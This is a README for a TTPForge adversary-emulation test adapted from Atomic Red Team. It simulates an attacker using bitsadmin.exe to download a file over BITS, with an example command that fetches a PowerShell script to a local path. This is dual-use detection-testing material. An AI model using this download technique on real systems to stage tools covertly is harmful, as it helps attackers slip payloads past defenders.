# Bitsadmin Download

## Description
Simulates adversary use of bitsadmin.exe to download files via BITS (Background Intelligent Transfer Service). BITS transfers may blend in with legitimate system update traffic.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **remote_file**: Remote file to download (default: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt`)
- **local_file**: Local file path to save downloaded file (default: `C:\Users\Public\malicious.bin`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//command-and-control/download-using-bitsadmin/ttp.yaml \
  --remote_file "https://example.com/tool.ps1" \
  --local_file "C:\Temp\script.ps1"
```

## Steps
1. **download_file_with_bitsadmin**: Uses bitsadmin.exe with the /transfer command to download a file from a remote URL to a local path with foreground priority.
